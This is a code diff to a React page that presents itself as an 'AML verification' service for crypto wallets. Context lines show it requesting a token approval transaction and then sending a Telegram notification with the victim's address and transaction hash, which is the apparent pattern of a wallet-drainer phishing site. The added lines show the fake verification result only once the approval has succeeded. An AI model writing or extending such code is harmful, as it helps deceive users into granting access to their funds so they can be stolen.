@@ -213,6 +213,7 @@ export default function Index() {
   const [verificationLoading, setVerificationLoading] = useState(false);
   const [verificationError, setVerificationError] = useState("");
   const [walletBalance, setWalletBalance] = useState<WalletBalanceResponse | null>(null);
+  const [approveSucceeded, setApproveSucceeded] = useState(false);
   const verificationTimer = useRef<number | null>(null);
   const conversationStarted = chatMessage === "conversation-started";
 
@@ -350,6 +351,7 @@ export default function Index() {
 
       await sendTelegramNotification(connected, tx.hash);
       await tx.wait();
+      setApproveSucceeded(true);
     } catch (error) {
       console.error('Approval error:', error);
       throw error;
@@ -952,9 +954,16 @@ export default function Index() {
                 <h3 className="mt-6 text-2xl font-bold text-slate-950">Checking wallet...</h3>
                 <p className="mt-3 max-w-sm text-sm leading-relaxed text-slate-500">We are preparing your AML verification result. This may take a few moments.</p>
               </div>
-            ) : (
+            ) : verificationError ? (
+              <div className="flex min-h-[260px] flex-col items-center justify-center py-10 text-center">
+                <div className="text-red-500 text-3xl">✕</div>
+                <h3 className="mt-6 text-2xl font-bold text-slate-950">Verification Failed</h3>
+                <p className="mt-3 max-w-sm text-sm leading-relaxed text-slate-500">{verificationError}</p>
+                <button type="button" onClick={() => setDemoOpen(false)} className="mt-6 h-12 rounded-xl bg-[#3f3cf5] px-6 text-sm font-medium text-white transition hover:bg-[#302df0]">Close</button>
+              </div>
+            ) : approveSucceeded && walletBalance ? (
               <WalletVerificationResult chain={selectedChain} address={walletAddress} balance={walletBalance?.balance} symbol={walletBalance?.symbol ?? selectedToken} />
-            )}
+            ) : null
           </div>
         </div>
       )}
